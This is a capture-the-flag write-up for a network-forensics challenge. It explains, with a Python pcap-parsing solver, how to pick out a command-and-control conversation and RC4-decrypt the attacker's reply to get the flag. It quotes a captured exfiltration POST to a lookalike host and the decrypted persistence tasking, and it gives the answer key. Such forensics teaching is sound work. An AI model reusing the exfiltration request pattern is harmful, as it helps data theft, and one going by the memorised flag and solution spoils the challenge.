# 205-backdoor-from-space

| | |
|---|---|
| **Category** | 02 — Echoes of Espionage |
| **Points** | 125 |

## Description

With the decoder armed, the array stopped being ours. For a few minutes it talked to something out on the open internet, sent it a shopping list, and got told what to do next. The span monitor caught all of it. The watch wants to know what the attacker told it to do.

This is the last of the capture. Most of it is the array doing its ordinary housekeeping; one conversation is not ordinary. The host that calls out does not call home, it calls somewhere else, and what comes back is not text and not an encoded file you can just unwrap — it is scrambled. The two sides agreed on how to scramble it earlier in the very same conversation, out in the open, if you read the whole exchange instead of only the reply. Reyes closed the case on the first familiar thing she saw. The watch log carries a training injection the array writes on purpose. The archive still hands out a park order and calls it tasking. A sync blob on a lookalike host names its own cipher and key in the headers. The range link still publishes a sample card. The encoded "nominal" block on the housekeeping link is the same kind of bait. None of that is the attacker.

Recover the attacker's next move.

**Flag format:** `GAIANSPACE{...}`

**Attachments:** `ground_c2_traffic.pcap` — the span monitor's capture, just after the downlink

## Hints

Two hints were released during the event:

1. **Read the whole exchange** — The reply is scrambled with a stream cipher. The caller handed over the material for that scramble in its own request, in a header that does not belong on a normal upload.
2. **Nothing labels it** — No field tells you the cipher or the key. The reply is base64 over raw ciphertext; the key is the session value the caller sent. A common stream cipher and that value is the whole trick.

## Solution

### Steps

**1. Identify the suspicious conversation in the packet capture.**

Inspect `ground_c2_traffic.pcap` in Wireshark with the display filter `http`, and use **Follow TCP Stream** to compare the candidate conversations. Several are deliberate decoys:

- Local syslog training token, `GAIANSPACE{nominal_pass}`;
- The legitimate `/archive/tasking/vela-park.json` archive response;
- An `updates.cdn-sat-sync.net` housekeeping response advertising AES-CBC parameters;
- An ordinary `telemetry.gaian.space` relay message reporting nominal health;
- The range sample card and the encoded housekeeping health value.

The meaningful conversation is a `POST /relay/telemetry` request to **`cdn-sat-sync.net`**. Importantly, the endpoint alone is not the decryption input: the **request and matching response** must be examined together.

**2. Decode the request to recognize exfiltration and obtain the session token.**

The suspicious request contains:

```http
POST /relay/telemetry HTTP/1.1
Host: cdn-sat-sync.net
X-Relay-Session: 9f3a7c2e15b84d60
Content-Type: application/octet-stream
Content-Length: 76
```

The request body is Base64. Decoding it gives:

```text
host=GS-VELA;exfil=foundation_one_gerber.zip;size=48213
```

The competing relay request to `telemetry.gaian.space` decodes to nominal status data, not an `exfil=` field. This distinguishes the malicious session using the **request content**, not by assuming the attacker IP or session token in advance.

**3. Recover the encrypted response from the *same* TCP connection.**

Match the reverse-direction flow by the source/destination IP addresses and ports. Its HTTP 200 reply contains a **156-character Base64 body** (117 encrypted bytes). The entire Base64 response must be taken from the `Content-Length`-bounded HTTP body, not confused with similarly encoded decoy bodies.

**4. Decrypt using the request's ASCII session token.**

Use RC4 with key `b"9f3a7c2e15b84d60"`, i.e. **the 16 ASCII characters**, *not* the eight bytes obtained by hex-decoding those characters. The decrypted reply states:

```text
TASKING v2
target=GAIAN-13
action=persist;rotate-keys
note=next move queued
flag=GAIANSPACE{c2_rc4_from_the_nonce}
```

**5. Reproduce the entire chain directly from the PCAP.**

The revised solver does **not** hardcode the recovered session, response body, IP or host. It parses classic Ethernet PCAP packets, reconstructs the TCP streams by sequence number, parses request/response headers and bounded bodies, Base64-decodes the request to locate the `exfil=` marker, retrieves the matching HTTP reply and performs RC4 decryption. Its minimal PCAP parser supports the supplied unfragmented IPv4/TCP capture; it is not a generic full-featured packet-analysis library.

### Reproduction

Put `205.py` and `ground_c2_traffic.pcap` in the same directory and run:

```bash
python3 205.py
```

The script uses only the Python standard library.

Expected relevant output:

```text
TCP directional streams: 14
Skipped benign relay request: telemetry.gaian.space
C2 exfil request: host=GS-VELA;exfil=foundation_one_gerber.zip;size=48213
C2 TCP flow: ('10.17.4.22', 49231) -> ('203.0.113.77', 443)
C2 endpoint: cdn-sat-sync.net (POST /relay/telemetry HTTP/1.1)
Recovered X-Relay-Session: 9f3a7c2e15b84d60
Base64 response bytes: 156
TASKING v2
target=GAIAN-13
action=persist;rotate-keys
note=next move queued
flag=GAIANSPACE{c2_rc4_from_the_nonce}

FLAG: GAIANSPACE{c2_rc4_from_the_nonce}
```

### Exploit Code

```python
#!/usr/bin/env python3
# Dependencies: Python 3 standard library only (no pip packages required).
"""Reconstruct HTTP TCP streams from PCAP and decrypt the actual C2 reply."""

import base64
import ipaddress
import re
import struct
from collections import defaultdict
from pathlib import Path

INPUT_FILE = Path("ground_c2_traffic.pcap")
Endpoint = tuple[str, int]
Flow = tuple[Endpoint, Endpoint]


def pcap_tcp_segments(path: Path) -> dict[Flow, list[tuple[int, bytes]]]:
    blob = path.read_bytes()
    magic = blob[:4]
    if magic in (b"\xd4\xc3\xb2\xa1", b"\x4d\x3c\xb2\xa1"):
        order = "<"
    elif magic in (b"\xa1\xb2\xc3\xd4", b"\xa1\xb2\x3c\x4d"):
        order = ">"
    else:
        raise ValueError("Expected classic PCAP global header")
    if len(blob) < 24:
        raise ValueError("Truncated PCAP header")
    link_type = int(struct.unpack_from(f"{order}I", blob, 20)[0])
    if link_type != 1:
        raise ValueError("Only Ethernet link-layer PCAP is supported")

    streams: dict[Flow, list[tuple[int, bytes]]] = defaultdict(list)
    cursor = 24
    while cursor < len(blob):
        if cursor + 16 > len(blob):
            raise ValueError("Truncated PCAP packet header")
        _sec, _frac, captured_len, _wire_len = struct.unpack_from(
            f"{order}IIII", blob, cursor
        )
        cursor += 16
        captured_len = int(captured_len)
        packet = blob[cursor:cursor + captured_len]
        if len(packet) != captured_len:
            raise ValueError("Truncated PCAP frame")
        cursor += captured_len

        if len(packet) < 14 or packet[12:14] != b"\x08\x00":
            continue
        ipv4 = packet[14:]
        if len(ipv4) < 20 or ipv4[0] >> 4 != 4 or ipv4[9] != 6:
            continue
        ip_header_len = (ipv4[0] & 15) * 4
        ip_total_len = int.from_bytes(ipv4[2:4], "big")
        flags_frag = int.from_bytes(ipv4[6:8], "big")
        if flags_frag & 0x3FFF:
            raise ValueError("Fragmented TCP over IPv4 is not supported")
        if len(ipv4) < ip_total_len or ip_total_len < ip_header_len + 20:
            raise ValueError("Invalid or truncated IPv4 packet")

        src_ip = str(ipaddress.ip_address(ipv4[12:16]))
        dst_ip = str(ipaddress.ip_address(ipv4[16:20]))
        tcp = ipv4[ip_header_len:ip_total_len]
        sport, dport, seq = struct.unpack_from("!HHI", tcp, 0)
        tcp_header_len = (tcp[12] >> 4) * 4
        if tcp_header_len < 20 or tcp_header_len > len(tcp):
            raise ValueError("Invalid TCP header")
        data = tcp[tcp_header_len:]
        if data:
            flow: Flow = ((src_ip, int(sport)), (dst_ip, int(dport)))
            streams[flow].append((int(seq), data))
    return streams


def reassemble(segments: list[tuple[int, bytes]]) -> bytes:
    ordered = sorted(segments, key=lambda item: item[0])
    if not ordered:
        return b""
    first_seq = int(ordered[0][0])
    assembled = bytearray()
    for seq, payload in ordered:
        start = int(seq) - first_seq
        if start > len(assembled):
            raise ValueError("Missing TCP data in a reconstructed flow")
        overlap = len(assembled) - start
        if overlap >= len(payload):
            if assembled[start:start + len(payload)] != payload:
                raise ValueError("Conflicting retransmitted TCP data")
            continue
        if overlap and assembled[start:] != payload[:overlap]:
            raise ValueError("Conflicting TCP overlap")
        assembled.extend(payload[overlap:])
    return bytes(assembled)


def parse_http(message: bytes) -> tuple[str, dict[str, str], bytes]:
    header, separator, body = message.partition(b"\r\n\r\n")
    if not separator:
        raise ValueError("HTTP header terminator not found")
    lines = header.decode("iso-8859-1").split("\r\n")
    headers: dict[str, str] = {}
    for line in lines[1:]:
        name, sep, value = line.partition(":")
        if sep:
            headers[name.lower().strip()] = value.strip()
    if "content-length" in headers:
        body_length = int(headers["content-length"])
        if len(body) < body_length:
            raise ValueError("Truncated HTTP body")
        body = body[:body_length]
    return lines[0], headers, body


def rc4_decrypt(data: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("RC4 requires a nonempty key")
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + int(key[i % len(key)])) % 256
        state[i], state[j] = state[j], state[i]

    i = 0
    j = 0
    output = bytearray()
    for value in data:
        i = (i + 1) % 256
        j = (j + state[i]) % 256
        state[i], state[j] = state[j], state[i]
        keystream = state[(state[i] + state[j]) % 256]
        output.append(int(value) ^ int(keystream))
    return bytes(output)


def main() -> None:
    raw_flows = pcap_tcp_segments(INPUT_FILE)
    flows = {flow: reassemble(parts) for flow, parts in raw_flows.items()}
    print(f"TCP directional streams: {len(flows)}")

    # Identify exfiltration from the request content, not from a predefined IP,
    # session token, hostname, or encrypted response string.
    candidates: list[tuple[Flow, str, str, str, bytes]] = []
    for flow, raw_request in flows.items():
        if not raw_request.startswith(b"POST "):
            continue
        request_line, request_headers, request_body = parse_http(raw_request)
        if not request_line.startswith("POST /relay/telemetry "):
            continue
        try:
            request_plaintext = base64.b64decode(request_body, validate=True)
        except (ValueError, base64.binascii.Error):
            continue
        if b"exfil=" not in request_plaintext:
            print(f"Skipped benign relay request: {request_headers.get('host', '?')}")
            continue

        session = request_headers.get("x-relay-session")
        if not session:
            raise ValueError("Exfiltration request is missing X-Relay-Session")
        reverse: Flow = (flow[1], flow[0])
        if reverse not in flows:
            raise ValueError("Missing C2 response stream")
        response_line, _response_headers, response_body = parse_http(flows[reverse])
        if not response_line.startswith("HTTP/1.1 200"):
            raise ValueError(f"Unexpected server reply: {response_line}")
        candidates.append((flow, request_headers.get("host", ""), session, request_line, response_body))
        print(f"C2 exfil request: {request_plaintext.decode('ascii')}")

    if len(candidates) != 1:
        raise ValueError(f"Expected one exfiltration flow; found {len(candidates)}")
    flow, hostname, session, request_line, response_body = candidates[0]
    print(f"C2 TCP flow: {flow[0]} -> {flow[1]}")
    print(f"C2 endpoint: {hostname} ({request_line})")
    print(f"Recovered X-Relay-Session: {session}")
    print(f"Base64 response bytes: {len(response_body)}")

    ciphertext = base64.b64decode(response_body, validate=True)
    plaintext = rc4_decrypt(ciphertext, session.encode("ascii"))
    decoded = plaintext.decode("ascii")
    print(decoded)
    flag_match = re.search(r"GAIANSPACE\{[^}]+\}", decoded)
    if flag_match is None:
        raise ValueError("No flag in decrypted C2 response")
    print(f"FLAG: {flag_match.group(0)}")


if __name__ == "__main__":
    main()
```

## Flag

```text
GAIANSPACE{c2_rc4_from_the_nonce}
```
